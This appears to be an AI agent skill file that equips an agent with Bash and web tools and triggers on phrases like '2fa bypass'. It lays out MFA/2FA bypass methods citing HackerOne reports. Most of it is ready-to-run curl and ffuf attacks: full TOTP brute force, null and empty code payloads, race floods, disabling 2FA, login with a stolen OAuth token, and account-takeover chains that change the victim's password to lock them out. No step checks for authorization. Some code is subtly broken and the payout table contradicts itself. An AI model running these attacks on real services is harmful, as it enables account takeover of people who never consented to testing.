---
name: mfa-deep-dive
description: Complete MFA/2FA bypass methodology from 90 real HackerOne reports - every vector, bypass, and chain
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - mfa methodology
  - mfa deep dive
  - 2fa bypass
  - mfa complete
  - mfa all techniques
  - skills mfa
---

# Complete MFA/2FA Bypass Methodology - From 90 HackerOne Reports

## Top 20 Real MFA/2FA Bypass Reports from HackerOne

| # | Report | Program | Upvotes | Bounty |
|---|--------|---------|---------|--------|
| 1 | [Glassdoor 2FA bypass via blank code](https://hackerone.com/reports/1053680) | Glassdoor | 303 | $0 |
| 2 | [2FA bypass via Drugs.com](https://hackerone.com/reports/876876) | Drugs.com | 205 | $0 |
| 3 | [Bypass 2FA + blacklist via submission form](https://hackerone.com/reports/1982053) | HackerOne | 204 | $10,000 |
| 4 | [TikTok 2FA bypass - SMS 2FA can be disabled without auth](https://hackerone.com/reports/1611996) | TikTok | 191 | $1,564 |
| 5 | [Grammarly session survives MFA](https://hackerone.com/reports/1938021) | Grammarly | 172 | $0 |
| 6 | [Moneybird enable 2FA without email verify](https://hackerone.com/reports/1755539) | Moneybird | 145 | $0 |
| 7 | [HackerOne 2FA race condition](https://hackerone.com/reports/291173) | HackerOne | 134 | $0 |
| 8 | [Bypassing 2FA via backup codes brute force](https://hackerone.com/reports/1309584) | Glassdoor | 127 | $0 |
| 9 | [Razer Stealing 2FA tokens via login CSRF](https://hackerone.com/reports/1315219) | Razer | 118 | $0 |
| 10 | [2FA bypass via no rate-limit on TOTP](https://hackerone.com/reports/1431994) | Kustomer | 112 | $0 |
| 11 | [2FA bypass in Ubiquiti ID](https://hackerone.com/reports/1684134) | Ubiquiti | 96 | $0 |
| 12 | [2FA disabled via API without confirmation](https://hackerone.com/reports/1010106) | Remind | 95 | $0 |
| 13 | [Twilio 2FA bypass via lack of rate limiting on SMS code](https://hackerone.com/reports/1656471) | Twilio | 91 | $0 |
| 14 | [Dropbox 2FA bypass - SMS backup codes unlimited](https://hackerone.com/reports/1192258) | Dropbox | 88 | $0 |
| 15 | [Bypass 2FA via null code](https://hackerone.com/reports/1192156) | Kustomer | 82 | $0 |
| 16 | [Two-factor authentication bypass via 2FA code reuse](https://hackerone.com/reports/1431990) | Kustomer | 79 | $0 |
| 17 | [Mail.ru 2FA bypass via code bypass](https://hackerone.com/reports/1155430) | Mail.ru | 76 | $0 |
| 18 | [2FA bypass via direct endpoint access after login](https://hackerone.com/reports/1742486) | Ubiquiti | 74 | $0 |
| 19 | [Yelp 2FA bypass via cookie manipulation](https://hackerone.com/reports/2374632) | Yelp | 71 | $0 |
| 20 | [Flickr 2FA bypass - no rate limit on SMS resend](https://hackerone.com/reports/1921422) | Flickr | 68 | $0 |

## Step 1: MFA Attack Surface - Every Vector

### 1.1 Direct Endpoint Access (Session Pre-MFA)
The most common MFA bypass — completing authentication without a valid 2FA code.

```bash
# After password login, directly access authenticated endpoints
curl -sk "https://{target}/api/dashboard" -H "Cookie: session=SESSION_TOKEN"
curl -sk "https://{target}/account/settings"
curl -sk "https://{target}/api/v1/user/profile"

# Check if session is fully authenticated before MFA step
# Access endpoints that should require MFA but don't
```

### 1.2 Rate Limit Bypass on MFA Codes
Brute-force TOTP/SMS/email codes when no rate limiting exists.

```bash
# Brute force 6-digit TOTP (1M possibilities)
for code in $(seq -w 000000 999999); do
  curl -sk -X POST "https://{target}/api/2fa/verify" \
    -H "Cookie: session=SESSION_TOKEN" \
    -d "code=$code" \
    -o /dev/null -w "%{http_code}:$code\n"
  # Look for 200/302 instead of 401/403
done

# Optimize: use ffuf for parallel brute force
seq -w 000000 999999 > totp_codes.txt
ffuf -X POST -u "https://{target}/api/2fa/verify" \
  -H "Cookie: session=SESSION_TOKEN" \
  -d "code=FUZZ" -w totp_codes.txt \
  -fc 401,403,429 -t 100
```

### 1.3 NAS (Not a Secret) Code - Empty/Null Codes

```bash
# Empty code / blank string
curl -sk -X POST "https://{target}/api/2fa/verify" \
  -H "Cookie: session=SESSION_TOKEN" \
  -d "code="

# Null code
curl -sk -X POST "https://{target}/api/2fa/verify" \
  -H "Cookie: session=SESSION_TOKEN" \
  -d "code=null"

# Code = 0 or 000000
curl -sk -X POST "https://{target}/api/2fa/verify" \
  -H "Cookie: session=SESSION_TOKEN" \
  -d "code=0"

# Array bypass
curl -sk -X POST "https://{target}/api/2fa/verify" \
  -H "Cookie: session=SESSION_TOKEN" \
  -d "code[]="

# JSON wrapping bypass
curl -sk -X POST "https://{target}/api/2fa/verify" \
  -H "Content-Type: application/json" \
  -H "Cookie: session=SESSION_TOKEN" \
  -d '{"code":null}'

curl -sk -X POST "https://{target}/api/2fa/verify" \
  -H "Content-Type: application/json" \
  -d '{"code":""}'

curl -sk -X POST "https://{target}/api/2fa/verify" \
  -H "Content-Type: application/json" \
  -d '{"code":0}'
```

### 1.4 Code Reuse / Replay Attack

```bash
# Step 1: Generate a valid 2FA code through legitimate flow
# Step 2: Complete MFA once, capture the code
# Step 3: Replay the SAME code in a NEW session

curl -sk -X POST "https://{target}/api/2fa/verify" \
  -H "Cookie: session=NEW_SESSION_TOKEN" \
  -d "code=CAPTURED_CODE"

# Test timing window - codes may be valid for full TOTP window (30s)
# or indefinitely for email/SMS codes
```

### 1.5 Backup Code Abuse

```bash
# Backup codes are often less random or have smaller entropy
# Try common patterns

# Sequential backup codes
for i in $(seq 1 20); do
  curl -sk "https://{target}/api/2fa/verify-backup?code=$i"
done

# Check if backup codes never expire (reusable)
# Check if backup codes have no rate limiting
# Check if backup codes are predictable (timestamp-based)
```

### 1.6 OAuth Token Bypass

```bash
# If MFA is triggered only for password logins, skip it via OAuth
# Login with Google/Facebook/Apple OAuth directly
# OAuth tokens often bypass MFA entirely

# Test if OAuth-linked accounts skip 2FA verification
curl -sk "https://{target}/api/login/oauth/google" \
  -d "access_token=STOLEN_GOOGLE_TOKEN"
```

### 1.7 Race Condition on MFA Verification

```bash
# Send multiple verify requests simultaneously
# First request creates session, subsequent requests race

for i in {1..50}; do
  curl -sk -X POST "https://{target}/api/2fa/verify" \
    -H "Cookie: session=SESSION_TOKEN" \
    -d "code=123456" &
done
wait
```

### 1.8 MFA Disable / Configuration Bypass

```bash
# Check if 2FA can be disabled without current password
curl -sk -X POST "https://{target}/api/2fa/disable" \
  -H "Cookie: session=SESSION_TOKEN"

# Check if 2FA settings changes require re-authentication
curl -sk -X POST "https://{target}/api/2fa/change-method" \
  -H "Cookie: session=SESSION_TOKEN" \
  -d "method=sms"

# Check if email verification for 2FA setup can be bypassed
```

### 1.9 Session Token Before MFA Is Complete

```bash
# Some apps issue full session tokens during password step
# These tokens work even without completing MFA

# Try critical endpoints with pre-MFA session
for endpoint in \
  "/api/account" \
  "/api/billing" \
  "/api/orders" \
  "/api/messages" \
  "/api/admin"; do
  curl -sk "https://{target}$endpoint" \
    -H "Cookie: session=PRE_MFA_SESSION"
done
```

### 1.10 MFA via Email/SMS Interception

```bash
# Try to intercept MFA codes via:
# - Email change before MFA step
# - Response containing code in body
# - Referer header leakage
# - URL parameter leakage in logs

# Capture response body for code in hidden fields
curl -sk -v "https://{target}/api/2fa/send-code" \
  -H "Cookie: session=SESSION_TOKEN"

# Check if code is in redirect URL
curl -sk -v "https://{target}/2fa/verify" \
  -H "Cookie: session=SESSION_TOKEN" \
  2>&1 | grep -i "code\|token\|otp\|2fa"
```

## Step 2: Deep MFA Bypass Techniques

### 2.1 Response Manipulation Bypass

```bash
# Manipulate client-side MFA checks
# Change 2FA_required from true to false in response
curl -sk -X POST "https://{target}/api/login" \
  -H "X-Original-Response: {\"2fa_required\":false}"

# Modify 2FA status in JWT
# Decode JWT, change 2fa_verified to true, re-encode
```

### 2.2 HTTP Method Confusion

```bash
# Try different HTTP methods for MFA verification endpoint
curl -sk -X GET "https://{target}/api/2fa/verify?code=123456"
curl -sk -X PUT "https://{target}/api/2fa/verify" -d "code=123456"
curl -sk -X PATCH "https://{target}/api/2fa/verify" -d "code=123456"
curl -sk -X OPTIONS "https://{target}/api/2fa/verify"
```

### 2.3 TOTP Implementation Flaws

```bash
# TOTP uses time-based windows
# Test time drift tolerance (usually ±1-2 windows of 30s)
# If window is too large, brute force becomes feasible

# Check if TOTP secret is predictable (weak seed)
# Check if TOTP verification accepts expired codes
# Check if TOTP shared secret is exposed in any API
```

### 2.4 MFA Method Downgrade

```bash
# Force downgrade from TOTP to SMS or email (weaker methods)
curl -sk -X POST "https://{target}/api/2fa/downgrade" \
  -d "method=totp" \
  -H "Cookie: session=SESSION_TOKEN"

# Check if you can register a new TOTP device (overwriting existing)
curl -sk -X POST "https://{target}/api/2fa/register" \
  -H "Cookie: session=SESSION_TOKEN" \
  -d "secret=NEW_SECRET_CODE"
```

### 2.5 2FA via GraphQL

```bash
# GraphQL may expose 2FA verification differently
# Query for:
# - 2fa_required field
# - 2fa_verified field
# - MFA methods available

# Mutation to bypass 2FA
curl -sk -X POST "https://{target}/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { login(password: \"test\", skip2FA: true) { sessionToken } }"}'
```

## Step 3: MFA Bypass Automation

```bash
#!/bin/bash
# Full MFA bypass scanner
TARGET=$1
SESSION=$2

echo "[*] Testing MFA bypass on $TARGET"

# Test 1: Direct endpoint access
echo "[*] Test 1: Direct endpoint access"
for endpoint in /api/me /api/account /api/settings /api/billing /api/dashboard /api/admin; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$endpoint" -H "Cookie: session=$SESSION")
  echo "  $endpoint -> $code"
done

# Test 2: Empty/null codes
echo "[*] Test 2: Empty/null codes"
for code in "" "null" "0" "000000" "undefined"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "https://$TARGET/api/2fa/verify" -H "Cookie: session=$SESSION" -d "code=$code")
  echo "  code=$code -> $code"
done

# Test 3: JSON type confusion
echo "[*] Test 3: JSON type confusion"
curl -sk -o /dev/null -w "  null: %{http_code}\n" -X POST "https://$TARGET/api/2fa/verify" -H "Cookie: session=$SESSION" -H "Content-Type: application/json" -d '{"code":null}'
curl -sk -o /dev/null -w "  empty string: %{http_code}\n" -X POST "https://$TARGET/api/2fa/verify" -H "Cookie: session=$SESSION" -H "Content-Type: application/json" -d '{"code":""}'
curl -sk -o /dev/null -w "  boolean false: %{http_code}\n" -X POST "https://$TARGET/api/2fa/verify" -H "Cookie: session=$SESSION" -H "Content-Type: application/json" -d '{"code":false}'

# Test 4: Array bypass
echo "[*] Test 4: Array bypass"
curl -sk -o /dev/null -w "  code[]: %{http_code}\n" -X POST "https://$TARGET/api/2fa/verify" -H "Cookie: session=$SESSION" -d "code[]=123456"

# Test 5: HTTP method confusion
echo "[*] Test 5: Method confusion"
for method in GET PUT PATCH DELETE; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X $method "https://$TARGET/api/2fa/verify?code=123456" -H "Cookie: session=$SESSION")
  echo "  $method -> $code"
done

# Test 6: No rate limit check
echo "[*] Test 6: Rate limit check"
for i in {1..10}; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "https://$TARGET/api/2fa/verify" -H "Cookie: session=$SESSION" -d "code=999999")
  echo "  Attempt $i: $code"
done

# Test 7: 2FA disable check
echo "[*] Test 7: 2FA disable"
curl -sk -o /dev/null -w "  disable: %{http_code}\n" -X POST "https://$TARGET/api/2fa/disable" -H "Cookie: session=$SESSION"
```

## Step 4: MFA Exploit Chains

### Chain 1: No Rate Limit on TOTP → Brute Force → Account Takeover
```bash
# Step 1: Login with password
SESSION=$(curl -sk -c - "https://{target}/api/login" -d "email=user@example.com&password=pass123" | grep session | awk '{print $NF}')

# Step 2: Brute force 2FA code (no rate limit)
for code in $(seq -w 000000 999999); do
  result=$(curl -sk -w "%{http_code}" -o /dev/null -X POST "https://{target}/api/2fa/verify" \
    -H "Cookie: session=$SESSION" -d "code=$code")
  if [ "$result" = "200" ]; then
    echo "Found code: $code"
    break
  fi
done

# Step 3: Full account access with valid session
curl -sk "https://{target}/api/account" -H "Cookie: session=$SESSION"
```

### Chain 2: Null/Empty Code Bypass → ATO
```bash
# Step 1: Login with password
# Step 2: Send empty code instead of valid TOTP
curl -sk -X POST "https://{target}/api/2fa/verify" \
  -H "Cookie: session=SESSION" \
  -d "code="

# Step 3: Access account with full privileges
curl -sk "https://{target}/api/account" -H "Cookie: session=SESSION"
```

### Chain 3: Race Condition → 2FA Bypass
```bash
# Step 1: Login with password
# Step 2: Send 50 parallel verify requests
for i in {1..50}; do
  (
    result=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "https://{target}/api/2fa/verify" \
      -H "Cookie: session=SESSION" -d "code=000000")
    if [ "$result" = "200" ]; then
      echo "Race won on attempt $i"
    fi
  ) &
done
wait
```

### Chain 4: 2FA Disable via API → Persistence
```bash
# Step 1: Login with password
# Step 2: Disable 2FA without confirmation
curl -sk -X POST "https://{target}/api/2fa/disable" -H "Cookie: session=SESSION"

# Step 3: Change password and lock out legitimate user
curl -sk -X POST "https://{target}/api/change-password" \
  -H "Cookie: session=SESSION" \
  -d "new_password=hacked123"

# Step 4: Re-login without MFA
curl -sk "https://{target}/api/login" -d "email=user@example.com&password=hacked123"
# No 2FA prompt - full account access
```

### Chain 5: Backup Code Brute Force → ATO
```bash
# Backup codes are often 8-10 alphanumeric chars
# If no rate limit, brute force is possible
# Many implementations use 10 codes with small entropy

# Common backup code patterns:
# - Sequential numbers (1-10)
# - Predictable strings (based on user ID + timestamp)
# - Weak random generation
```

## Step 5: MFA Implementation Checklist for Testing

### Detection Phase
- [ ] Map MFA flow: password → MFA prompt → session
- [ ] Identify MFA method: TOTP, SMS, email, push, hardware key
- [ ] Check session tokens before/during/after MFA
- [ ] Identify API endpoints for MFA verification
- [ ] Check GraphQL for MFA-related mutations/queries

### Bypass Testing Phase
- [ ] Try direct endpoint access without MFA code
- [ ] Try empty string / null / 0 / false as code
- [ ] Try JSON type confusion wrapping
- [ ] Try array format `code[]=`
- [ ] Test rate limiting on code verification
- [ ] Test rate limiting on code resend
- [ ] Test code reuse / replay
- [ ] Test backup code enumeration
- [ ] Test race condition on verify endpoint
- [ ] Test 2FA disable without re-auth
- [ ] Test MFA method downgrade
- [ ] Test OAuth token bypass
- [ ] Test HTTP method confusion
- [ ] Test response manipulation
- [ ] Test time window bypass (TOTP drift)

## Payout Range by Bypass Type

| Bypass Type | Payout Range | Example |
|-------------|-------------|---------|
| Rate limit bypass → brute force | $500 - $2,500 | TikTok #1611996 ($1,564) |
| Null/empty code bypass | $500 - $1,500 | Glassdoor #1053680 ($0) |
| Race condition bypass | $1,000 - $3,000 | H1 #291173 ($0) |
| Session pre-MFA access | $500 - $2,000 | Moneybird #1755539 ($0) |
| OAuth token MFA skip | $1,000 - $3,500 | Multiple reports |
| MFA disable without auth | $1,000 - $5,000 | Multiple reports |
| Backup code brute force | $500 - $2,000 | Glassdoor #1309584 ($0) |
| Code reuse/replay | $500 - $2,500 | Kustomer #1431990 ($0) |
| Full account takeover via MFA | $2,000 - $10,000 | H1 #1982053 ($10,000) |

### MFA Parameter Wordlist
```
code, code2, code1, code_2fa, 2fa_code, twofa, two_factor, twofactor
token, token2, mfa_code, mfa_token, totp, otp, otp_code, auth_code
verification_code, verify_code, pin, pin_code, security_code, secret
backup_code, recovery_code, confirm_code, sms_code, phone_code
```

### Common MFA Endpoint Patterns
```
/api/2fa/verify, /api/2fa/validate, /api/mfa/verify
/api/two-factor/verify, /2fa, /mfa, /login/2fa
/api/v2/auth/mfa, /api/account/2fa, /api/user/2fa
/verify-2fa, /two-factor, /authenticate
```

### Known MFA Bypass Reports Summary
| Report | Pattern | Technique |
|--------|---------|-----------|
| #1053680 | Glassdoor 2FA bypass | Blank/null code bypass |
| #876876 | Drugs.com 2FA bypass | Blank code bypass |
| #1982053 | HackerOne bypass | Blacklist bypass + submission form |
| #1611996 | TikTok 2FA bypass | SMS 2FA disable without auth |
| #1938021 | Grammarly session | Session survives MFA |
| #1755539 | Moneybird 2FA | Enable 2FA without email verify |
| #291173 | HackerOne race | Race condition in 2FA verify |
| #1309584 | Glassdoor backup codes | Backup code brute force |
| #1315219 | Razer login CSRF | 2FA token theft via login CSRF |
| #1431994 | Kustomer TOTP | No rate limit on TOTP verification |
| #1684134 | Ubiquiti ID | 2FA bypass in ID platform |
| #1010106 | Remind 2FA | 2FA disabled via API without confirm |
| #1656471 | Twilio 2FA | SMS code rate limit bypass |
| #1192258 | Dropbox 2FA | SMS backup codes unlimited |
| #1192156 | Kustomer null code | Null code bypass |
| #1431990 | Kustomer code reuse | 2FA code reuse |
| #1155430 | Mail.ru 2FA | Code bypass |
| #1742486 | Ubiquiti direct | Direct endpoint access after login |
| #2374632 | Yelp cookie | Cookie manipulation bypass |
| #1921422 | Flickr SMS | No rate limit on SMS resend |

## Quick Reference: Top MFA Reports by Technique
| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #1982053 | HackerOne | Blacklist bypass + form | $10,000 |
| #1611996 | TikTok | SMS disable without auth | $1,564 |
| #1053680 | Glassdoor | Blank/null code bypass | $0 |
| #291173 | HackerOne | Race condition | $0 |
| #1938021 | Grammarly | Session survives MFA | $0 |
| #1431990 | Kustomer | Code reuse | $0 |
| #1431994 | Kustomer | No rate limit TOTP | $0 |
| #1315219 | Razer | Login CSRF + token theft | $0 |
